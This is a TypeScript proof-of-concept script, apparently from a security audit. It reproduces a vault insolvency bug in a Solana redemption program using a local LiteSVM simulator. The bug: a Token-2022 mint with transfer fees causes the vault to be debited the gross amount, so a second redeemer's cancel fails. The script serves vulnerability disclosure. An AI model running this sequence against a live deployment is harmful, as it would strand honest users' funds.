// Standalone PoC runner — bypasses vitest entirely (vitest's module-loading crashes litesvm's
// native addon with std::bad_alloc, reproducibly, across Docker+old-kernel and fresh GH Actions
// ubuntu-24.04, with every pool/isolation config tried — plain `node`/`tsx` does not have this
// problem, confirmed via a minimal `node -e` sanity check first). Same LiteSVM engine, same
// compiled onreapp.so, same instruction sequence as tests/redemption/_poc_token2022_fee_insolvency.spec.ts —
// just run as a plain script instead of through vitest.
import { Keypair, PublicKey, Transaction } from "@solana/web3.js";
import {
    TOKEN_2022_PROGRAM_ID,
    getAssociatedTokenAddressSync,
    createAssociatedTokenAccountInstruction,
    createMintToInstruction,
} from "@solana/spl-token";
import { TestHelper } from "./tests/test_helper";
import { OnreProgram } from "./tests/onre_program.ts";

function assertEqual(actual: unknown, expected: unknown, label: string) {
    const a = String(actual);
    const e = String(expected);
    if (a !== e) throw new Error(`ASSERTION FAILED: ${label} — expected ${e}, got ${a}`);
    console.log(`  OK  ${label} (${a})`);
}

async function main() {
    const testHelper = await TestHelper.create();
    const program = new OnreProgram(testHelper);

    const GROSS_AMOUNT = 1_000_000_000;
    const FEE_BPS = 500;
    const MAX_FEE = BigInt(5_000_000);

    const usdcMint = testHelper.createMint(6);
    const onycMint = testHelper.createMint(9);
    await program.initialize({ onycMint });

    const redemptionAdmin = testHelper.createUserAccount();
    await program.setRedemptionAdmin({ redemptionAdmin: redemptionAdmin.publicKey });

    const feeMint = await testHelper.createMint2022WithTransferFee(9, FEE_BPS, MAX_FEE);

    await program.makeOffer({ tokenInMint: usdcMint, tokenOutMint: feeMint });
    const offerPda = program.getOfferPda(usdcMint, feeMint);

    await program.makeRedemptionOffer({ offer: offerPda, tokenInProgram: TOKEN_2022_PROGRAM_ID });
    const redemptionOfferPda = program.getRedemptionOfferPda(feeMint, usdcMint);

    async function fundRedeemer(): Promise<Keypair> {
        const user = testHelper.createUserAccount();
        const ata = getAssociatedTokenAddressSync(feeMint, user.publicKey, false, TOKEN_2022_PROGRAM_ID);
        const createAtaIx = createAssociatedTokenAccountInstruction(
            testHelper.payer.publicKey, ata, user.publicKey, feeMint, TOKEN_2022_PROGRAM_ID
        );
        const mintToIx = createMintToInstruction(
            feeMint, ata, testHelper.getBoss(), BigInt(10_000e9), [], TOKEN_2022_PROGRAM_ID
        );
        const tx = new Transaction().add(createAtaIx, mintToIx);
        tx.recentBlockhash = testHelper.lastBlockhash;
        tx.sign(testHelper.payer);
        testHelper.svm.sendTransaction(tx);
        return user;
    }

    const redeemerA = await fundRedeemer();
    const redeemerB = await fundRedeemer();

    const vaultAta = getAssociatedTokenAddressSync(
        feeMint, program.pdas.redemptionVaultAuthorityPda, true, TOKEN_2022_PROGRAM_ID
    );
    const createVaultAtaIx = createAssociatedTokenAccountInstruction(
        testHelper.payer.publicKey, vaultAta, program.pdas.redemptionVaultAuthorityPda, feeMint, TOKEN_2022_PROGRAM_ID
    );
    const vaultAtaTx = new Transaction().add(createVaultAtaIx);
    vaultAtaTx.recentBlockhash = testHelper.lastBlockhash;
    vaultAtaTx.sign(testHelper.payer);
    testHelper.svm.sendTransaction(vaultAtaTx);

    console.log("Step 1: create_redemption_request x2 (this is where take_offer would throw 'Token-2022 with transfer fees not supported' — redemption has no such guard)");
    await program.createRedemptionRequest({
        redemptionOffer: redemptionOfferPda, redeemer: redeemerA, amount: GROSS_AMOUNT, tokenProgram: TOKEN_2022_PROGRAM_ID,
    });
    await program.createRedemptionRequest({
        redemptionOffer: redemptionOfferPda, redeemer: redeemerB, amount: GROSS_AMOUNT, tokenProgram: TOKEN_2022_PROGRAM_ID,
    });
    console.log("  OK  both create_redemption_request calls succeeded (no fee-guard rejection)");

    const vaultAfterDeposits = await testHelper.getTokenAccountBalance(vaultAta);
    const expectedNetPerDeposit = BigInt(GROSS_AMOUNT) - MAX_FEE;
    assertEqual(vaultAfterDeposits, expectedNetPerDeposit * BigInt(2), "vault balance after 2 deposits = 2x(gross-fee), NOT 2x gross");

    const redemptionOfferAfterDeposits = await program.getRedemptionOffer(feeMint, usdcMint);
    assertEqual(redemptionOfferAfterDeposits.requestedRedemptions.toString(), (GROSS_AMOUNT * 2).toString(), "requested_redemptions records GROSS (2x full amount)");

    const recordedObligation = BigInt(GROSS_AMOUNT) * BigInt(2);
    if (!(recordedObligation > vaultAfterDeposits)) {
        throw new Error(`ASSERTION FAILED: solvency invariant should already be broken here — recorded=${recordedObligation} vault=${vaultAfterDeposits}`);
    }
    console.log(`  OK  solvency invariant already broken: recorded obligation ${recordedObligation} > actual vault balance ${vaultAfterDeposits}`);

    console.log("Step 2: redeemer A (honest, first-mover) cancels — should succeed by consuming part of B's principal");
    const redemptionRequestAPda = program.getRedemptionRequestPda(redemptionOfferPda, 0);
    await program.cancelRedemptionRequest({
        redemptionOffer: redemptionOfferPda,
        redemptionRequest: redemptionRequestAPda,
        signer: redeemerA,
        redemptionAdmin: redemptionAdmin.publicKey,
        tokenProgram: TOKEN_2022_PROGRAM_ID,
    });
    const vaultAfterACancel = await testHelper.getTokenAccountBalance(vaultAta);
    assertEqual(vaultAfterACancel, vaultAfterDeposits - BigInt(GROSS_AMOUNT), "vault debited the full GROSS amount on A's cancel (not the net A actually contributed)");

    console.log("Step 3: redeemer B (entirely honest, did nothing wrong) tries to cancel their own still-pending request");
    const redemptionRequestBPda = program.getRedemptionRequestPda(redemptionOfferPda, 1);
    let bCancelFailed = false;
    let bCancelError = "";
    try {
        await program.cancelRedemptionRequest({
            redemptionOffer: redemptionOfferPda,
            redemptionRequest: redemptionRequestBPda,
            signer: redeemerB,
            redemptionAdmin: redemptionAdmin.publicKey,
            tokenProgram: TOKEN_2022_PROGRAM_ID,
        });
    } catch (err) {
        bCancelFailed = true;
        bCancelError = err instanceof Error ? err.message : String(err);
    }

    if (!bCancelFailed) {
        throw new Error("ASSERTION FAILED (finding NOT reproduced): B's cancel succeeded — vault was NOT insolvent as hypothesized");
    }
    console.log(`  OK  B's cancel FAILED as predicted (vault insolvent for B's own recorded amount): ${bCancelError.slice(0, 200)}`);

    console.log("\n=== PoC CONFIRMED ===");
    console.log(`Vault balance after A's ordinary, allowed cancel: ${vaultAfterACancel}`);
    console.log(`B's own recorded redemption amount (what B is owed): ${GROSS_AMOUNT}`);
    console.log(`Shortfall: ${BigInt(GROSS_AMOUNT) - vaultAfterACancel} — B is permanently stuck, no malice or timing attack required, only an ordinary Token-2022 fee-bearing mint configured as redemption token_in.`);
}

main().then(() => {
    console.log("\nPoC script completed successfully — vulnerability reproduced end-to-end against the real compiled program.");
    process.exit(0);
}).catch((err) => {
    console.error("\nPoC script FAILED (vulnerability NOT reproduced, or an assertion broke):");
    console.error(err);
    process.exit(1);
});
